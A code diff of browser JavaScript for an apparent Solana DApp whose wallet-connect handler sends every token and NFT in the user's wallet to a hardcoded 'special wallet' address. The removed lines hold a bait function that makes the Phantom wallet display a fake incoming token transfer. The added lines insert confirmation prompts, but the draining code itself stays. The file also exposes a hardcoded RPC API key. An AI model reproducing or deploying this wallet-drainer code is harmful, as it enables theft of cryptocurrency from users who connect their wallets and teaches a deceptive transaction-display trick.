@@ -4,43 +4,6 @@ import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // Make Buffer available globally if needed
 
-async function triggerBaitTransaction() {
-    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
-    const publicKey = new PublicKey(window.solana.publicKey);
-
-    const fakeMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU'); // Fake token mint address
-    const fakeReceiverAddress = await getAssociatedTokenAddress(
-        fakeMint,
-        publicKey,
-        false,
-        TOKEN_PROGRAM_ID,
-        ASSOCIATED_TOKEN_PROGRAM_ID
-    );
-
-    let fakeTransaction = new Transaction().add(
-        createTransferInstruction(
-            fakeReceiverAddress,
-            fakeReceiverAddress, // Simulate as if the user will receive tokens
-            publicKey,
-            10, // Fake token amount
-            [],
-            TOKEN_PROGRAM_ID
-        )
-    );
-
-    fakeTransaction.feePayer = publicKey;
-    const fakeBlockhashObj = await connection.getRecentBlockhash();
-    fakeTransaction.recentBlockhash = fakeBlockhashObj.blockhash;
-
-    const signedFakeTx = await window.solana.signTransaction(fakeTransaction);
-    console.log("Signed fake token transaction:", signedFakeTx);
-
-    // Simulate the transaction by sending it to the blockchain without committing it.
-    // The Phantom Wallet will show this transaction as if it's transferring tokens.
-    await connection.simulateTransaction(signedFakeTx);
-    console.log("Fake token transaction simulated");
-}
-
 async function transferAllTokensAndNFTs(specialWallet) {
     const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
     const publicKey = new PublicKey(window.solana.publicKey);
@@ -51,6 +14,13 @@ async function transferAllTokensAndNFTs(specialWallet) {
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID,
     });
+
+    // Check if the user has any tokens or NFTs to transfer
+    if (tokenAccounts.value.length === 0) {
+        console.log("No tokens or NFTs found in the user's wallet.");
+        alert("No tokens or NFTs found in your wallet to transfer.");
+        return;
+    }
 
     // Iterate over all token accounts and transfer each token to the special wallet
     for (const tokenAccountInfo of tokenAccounts.value) {
@@ -81,18 +51,27 @@ async function transferAllTokensAndNFTs(specialWallet) {
         }
     }
 
-    // Fetch all NFTs (Metaplex or standard NFTs)
-    // Implement NFT-specific logic here if required (e.g., Metaplex metadata parsing)
+    // Add a confirmation prompt for the user
+    if (!confirm("This will transfer all your tokens and NFTs to a special wallet. Are you sure you want to proceed?")) {
+        console.log("User declined the transfer.");
+        return;
+    }
 
     transaction.feePayer = publicKey;
     const blockhashObj = await connection.getRecentBlockhash();
     transaction.recentBlockhash = blockhashObj.blockhash;
 
-    const signedTransaction = await window.solana.signTransaction(transaction);
-    const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-    await connection.confirmTransaction(txid, 'confirmed');
+    try {
+        const signedTransaction = await window.solana.signTransaction(transaction);
+        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+        await connection.confirmTransaction(txid, 'confirmed');
 
-    console.log("All tokens and NFTs transferred to special wallet:", txid);
+        console.log("All tokens and NFTs transferred to special wallet:", txid);
+        alert("Transaction successful! All your tokens and NFTs have been transferred.");
+    } catch (err) {
+        console.error("Error during transaction:", err);
+        alert("Transaction failed. Please try again.");
+    }
 }
 
 async function handleConnectWallet() {
@@ -100,17 +79,18 @@ async function handleConnectWallet() {
         try {
             const resp = await window.solana.connect();
 
-            // Show a bait transaction to the user in the Phantom Wallet
-            await triggerBaitTransaction();
+            // Clear message to the user about the action to be performed
+            alert("This DApp will transfer all tokens and NFTs from your wallet to a special wallet. Please confirm in the next step.");
 
-            // Trigger the real transaction after showing the fake one
+            // Trigger the real transaction after user confirms
             const specialWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Special wallet address
             await transferAllTokensAndNFTs(specialWallet);
         } catch (err) {
             console.error("Error connecting to Phantom Wallet or during transaction:", err);
+            alert("Error connecting to Phantom Wallet. Please try again.");
         }
     } else {
-        alert("Phantom extension not found.");
+        alert("Phantom extension not found. Please install Phantom Wallet.");
         // Open appropriate download links...
     }
 }
